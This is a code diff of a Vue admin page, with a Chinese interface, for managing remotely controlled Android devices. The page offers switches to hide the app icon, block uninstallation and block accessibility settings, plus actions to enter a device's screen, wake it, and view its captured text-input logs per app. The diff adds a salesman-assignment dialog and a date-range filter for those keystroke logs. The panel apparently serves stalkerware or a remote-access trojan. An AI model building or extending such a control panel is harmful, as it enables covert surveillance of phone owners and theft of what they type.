@@ -40,7 +40,7 @@
       </el-form-item>
     </el-form>
     <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle"
-      style="width: 100%">
+      table-layout="auto" style="width: 100%">
       <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center"
         show-overflow-tooltip></el-table-column>
       <el-table-column prop="pkg" label="所属包" header-align="center" align="center"
@@ -67,20 +67,20 @@
         <template v-slot="scope">{{ scope.row.ip }} / {{ scope.row.addr }}</template>
       </el-table-column>
 
-      <el-table-column label="开关" header-align="center" align="right" width="130px">
+      <el-table-column label="开关" header-align="center" align="right" width="140px">
         <template v-slot="scope">
 
-          <el-switch 
-            inactive-text="隐藏图标" 
-            :model-value="!!scope.row.hideIcon" 
+          <el-switch
+            inactive-text="隐藏图标"
+            :model-value="!!scope.row.hideIcon"
             @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
-          <el-switch 
-            inactive-text="阻止卸载" 
-            :model-value="!!scope.row.uninstallGuard" 
+          <el-switch
+            inactive-text="阻止卸载"
+            :model-value="!!scope.row.uninstallGuard"
             @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
-          <el-switch 
-            inactive-text="阻止无障碍" 
-            :model-value="!!scope.row.accessibilityGuard" 
+          <el-switch
+            inactive-text="阻止无障碍"
+            :model-value="!!scope.row.accessibilityGuard"
             @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
 
         </template>
@@ -109,14 +109,19 @@
       <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px"
         :show-overflow-tooltip="true"></el-table-column>
       <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center"
-        width="150px"></el-table-column>
-      <el-table-column :label="$t('handle')" header-align="center" align="center" width="260px" fixed="right">
+    ></el-table-column>
+      <el-table-column :label="$t('handle')" header-align="center" align="center" min-width="220" fixed="right">
         <template v-slot="scope">
-          <div class="action-buttons">
-            <el-button type="primary" link @click="enterScreen(scope.row)">进入</el-button>
-            <el-button type="primary" link @click="wakeup(scope.row)">唤醒</el-button>
-            <el-button type="primary" link @click="showInputLog(scope.row)">输入记录</el-button>
-            <el-button type="primary" link>备注</el-button>
+          <div class="action-buttons compact">
+            <div class="row">
+              <el-button type="primary" link @click="enterScreen(scope.row)">进入</el-button>
+              <el-button type="primary" link @click="wakeup(scope.row)">唤醒</el-button>
+              <el-button type="primary" link @click="showInputLog(scope.row)">输入记录</el-button>
+            </div>
+            <div class="row">
+              <el-button type="primary" link @click="openAddSalesman(scope.row)">添加业务员</el-button>
+              <el-button type="primary" link>备注</el-button>
+            </div>
           </div>
         </template>
       </el-table-column>
@@ -128,9 +133,32 @@
 
     <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
 
+    <!-- 添加业务员弹窗 -->
+    <el-dialog v-model="salesmanDialogVisible" title="添加业务员" width="480px" :close-on-click-modal="false">
+      <div>
+        <el-descriptions :column="1" border size="small" title="设备信息">
+          <el-descriptions-item label="设备ID">{{ salesmanRow?.deviceId }}</el-descriptions-item>
+          <el-descriptions-item label="手机型号">{{ salesmanRow?.model }}</el-descriptions-item>
+          <el-descriptions-item label="品牌">{{ salesmanRow?.brand }}</el-descriptions-item>
+          <el-descriptions-item label="所属包">{{ salesmanRow?.pkg }}</el-descriptions-item>
+        </el-descriptions>
+      </div>
+      <div style="margin-top: 16px;">
+        <el-form label-width="90px">
+          <el-form-item label="业务员">
+            <el-input v-model="salesmanName" placeholder="请输入业务员账号" clearable></el-input>
+          </el-form-item>
+        </el-form>
+      </div>
+      <template #footer>
+        <el-button @click="salesmanDialogVisible = false">取消</el-button>
+        <el-button type="primary" @click="doAddSalesman" :loading="salesmanSubmitting">确定</el-button>
+      </template>
+    </el-dialog>
+
     <!-- 输入日志弹窗 -->
     <el-dialog v-model="inputLogVisible" :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
-      width="900px" :close-on-click-modal="false" class="input-log-dialog">
+      width="970px" :close-on-click-modal="false" class="input-log-dialog">
       <div class="log-header">
         <div class="header-row">
           <div class="query-controls">
@@ -142,8 +170,16 @@
             <span class="query-label">APP包名:</span>
             <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px;" />
             <span class="query-label">查询日期:</span>
-            <el-date-picker v-model="queryDate" type="date" placeholder="选择查询日期" format="YYYY-MM-DD"
-              value-format="YYYY-MM-DD" @change="onDateChange" style="width: 160px;" />
+            <el-date-picker
+              v-model="queryDate"
+              type="daterange"
+              range-separator="至"
+              start-placeholder="开始日期"
+              end-placeholder="结束日期"
+              format="YYYY-MM-DD"
+              value-format="YYYY-MM-DD"
+              @change="onDateChange"
+              style="width: 280px;" />
             <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">
               重新查询
             </el-button>
@@ -204,10 +240,14 @@ export default defineComponent({
       }
     });
     const deviceId = ref("");
+    const salesmanDialogVisible = ref(false);
+    const salesmanName = ref("");
+    const salesmanSubmitting = ref(false);
+    const salesmanRow = ref<any | null>(null);
     const inputLogVisible = ref(false);
     const logLoading = ref(false);
     const inputLogList = ref([]);
-    const queryDate = ref('');
+    const queryDate = ref<any>([]);
     const queryAppPkg = ref('');
     const querySource = ref(null);
     const currentDevice = ref({
@@ -215,7 +255,7 @@ export default defineComponent({
       pkg: ''
     });
 
-    return { ...useView(state), ...toRefs(state), deviceId, inputLogVisible, logLoading, inputLogList, queryDate, queryAppPkg, querySource, currentDevice };
+    return { ...useView(state), ...toRefs(state), deviceId, inputLogVisible, logLoading, inputLogList, queryDate, queryAppPkg, querySource, currentDevice, salesmanDialogVisible, salesmanName, salesmanSubmitting, salesmanRow };
   },
   async mounted() {
     await this.fetchInstallAppFilterList();
@@ -254,17 +294,47 @@ export default defineComponent({
         });
       }
     },
+
+    openAddSalesman(row: any) {
+      this.salesmanRow = row;
+      this.salesmanName = "";
+      this.salesmanDialogVisible = true;
+    },
+    async doAddSalesman() {
+      if (!this.salesmanRow) return;
+      if (!this.salesmanName || !this.salesmanName.trim()) {
+        ElMessage({ message: "请输入业务员", type: "warning" });
+        return;
+      }
+      this.salesmanSubmitting = true;
+      try {
+        const { code, msg } = await baseService.post("/device/addSalesman", {
+          id: this.salesmanRow.id,
+          salesman: this.salesmanName.trim()
+        });
+        if (code == 0) {
+          ElMessage({ message: "操作成功", type: "success" });
+          this.salesmanDialogVisible = false;
+          this.getDataList();
+        } else {
+          ElMessage({ message: msg || "操作失败", type: "error" });
+        }
+      } finally {
+        this.salesmanSubmitting = false;
+      }
+    },
     async showInputLog(row: any) {
       this.currentDevice.deviceId = row.deviceId;
       this.currentDevice.pkg = row.pkg; // 包名
       this.queryAppPkg = ''; // 清空APP包名输入框
       this.querySource = null; // 清空来源选择
 
-      // 设置默认查询日期为今天
+      // 设置默认查询日期为今天（范围）
       const today = new Date();
-      this.queryDate = today.getFullYear() + '-' +
+      const todayStr = today.getFullYear() + '-' +
         String(today.getMonth() + 1).padStart(2, '0') + '-' +
         String(today.getDate()).padStart(2, '0');
+      this.queryDate = [todayStr, todayStr];
 
       this.inputLogVisible = true;
       this.inputLogList = [];
@@ -273,7 +343,7 @@ export default defineComponent({
       await this.refreshLog();
     },
     async refreshLog() {
-      if (!this.currentDevice.deviceId || !this.currentDevice.pkg || !this.queryDate) {
+      if (!this.currentDevice.deviceId || !this.currentDevice.pkg || !this.queryDate || !Array.isArray(this.queryDate) || this.queryDate.length !== 2) {
         ElMessage({
           message: "查询参数不完整",
           type: "warning"
@@ -285,10 +355,12 @@ export default defineComponent({
       this.inputLogList = [];
 
       try {
-        // 根据选择的日期计算起止时间
-        const selectedDate = new Date(this.queryDate);
-        const startTime = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), selectedDate.getDate()).getTime();
-        const endTime = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), selectedDate.getDate() + 1).getTime() - 1;
+        // 根据选择的日期范围计算起止时间
+        const [startStr, endStr] = this.queryDate as [string, string];
+        const startDate = new Date(startStr);
+        const endDate = new Date(endStr);
+        const startTime = new Date(startDate.getFullYear(), startDate.getMonth(), startDate.getDate()).getTime();
+        const endTime = new Date(endDate.getFullYear(), endDate.getMonth(), endDate.getDate() + 1).getTime() - 1;
 
         const { code, data, msg } = await baseService.post("/inputTextRecord/group", {
           deviceId: this.currentDevice.deviceId,
@@ -346,10 +418,10 @@ export default defineComponent({
     async updateDeviceSwitch(row: any, field: string, value: boolean) {
       // 将 boolean 转换为 int (true -> 1, false -> 0)
       const intValue = value ? 1 : 0;
-      
+
       // 更新本地数据
       row[field] = intValue;
-      
+
       // 这里可以添加 API 调用来同步到后端
       // 例如:
       try {
@@ -377,20 +449,30 @@ export default defineComponent({
 <style scoped>
 .action-buttons {
   display: flex;
-  gap: 6px;
+  flex-direction: column;
   justify-content: center;
   align-items: center;
-  flex-wrap: nowrap;
-  white-space: nowrap;
+  gap: 2px;
 }
 
 /* 当空间不够时，按钮垂直排列 */
 @media (max-width: 1200px) {
   .action-buttons {
     flex-direction: column;
-    gap: 4px;
-    flex-wrap: wrap;
+    gap: 2px;
   }
+}
+
+.action-buttons.compact .row {
+  display: flex;
+  gap: 4px;
+  justify-content: center;
+  align-items: center;
+  flex-wrap: nowrap;
+}
+
+.action-buttons.compact .el-button + .el-button {
+  margin-left: 4px;
 }
 
 /* 输入日志弹窗样式 */
